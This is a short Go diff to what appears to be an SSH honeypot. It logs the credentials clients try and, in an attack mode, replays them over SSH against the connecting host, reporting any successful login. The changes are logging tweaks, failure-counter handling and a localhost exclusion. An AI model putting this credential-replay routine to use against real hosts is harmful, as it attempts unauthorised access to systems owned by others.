@@ -64,7 +64,7 @@ func attacker(attCh <-chan *Attacker) {
 			}
 
 		case host := <-doneCh:
-			log.Printf("removing %s from cachemap.\n", host)
+			log.Printf("removing %s from cache.\n", host)
 			delete(cacheMap, host)
 		}
 	}
@@ -81,14 +81,19 @@ L:
 		select {
 		case cred := <-credCh:
 			if netfailed >= 3 {
-				log.Printf("NOT attacking %s: too many network failures.\n", host)
+				if netfailed == 3 {
+					log.Printf("NOT attacking %s: too many network failures.\n", host)
+					netfailed = netfailed + 1
+				}
 				continue // just consume the creds and don't connect out.
 			}
 			c, err := net.Dial("tcp", target)
 			if err != nil {
+				log.Printf("Fail: unable to establish tcp connection to %s\n", target)
 				netfailed = netfailed + 1
 				continue
 			}
+			netfailed = 0
 			cConfig := &ssh.ClientConfig{
 				User:          cred.user,
 				Auth:          []ssh.AuthMethod{ssh.Password(cred.pass)},
@@ -96,7 +101,7 @@ L:
 			}
 			conn, _, _, err := ssh.NewClientConn(c, target, cConfig)
 			if err != nil {
-				log.Printf("Fail: tried attacking %s with %s:%s \n", host, cred.user, cred.pass)
+				log.Printf("Fail: tried attacking %s with %s:%s\n", host, cred.user, cred.pass)
 			} else {
 				conn.Close()
 				log.Printf("*** SUCCESS ***: %s:%s worked on %s\n", cred.user, cred.pass, host)
@@ -151,7 +156,7 @@ func main() {
 				log.Fatalf("bad host or port: %s\n", conn.RemoteAddr().String())
 			}
 			log.Printf("Attacker %s tried: %s:%s\n", host, conn.User(), pass)
-			if *attackMode {
+			if *attackMode  && host != "127.0.0.1" {
 				attCh <- &Attacker{
 					Cred{conn.User(), string(pass)},
 					host,
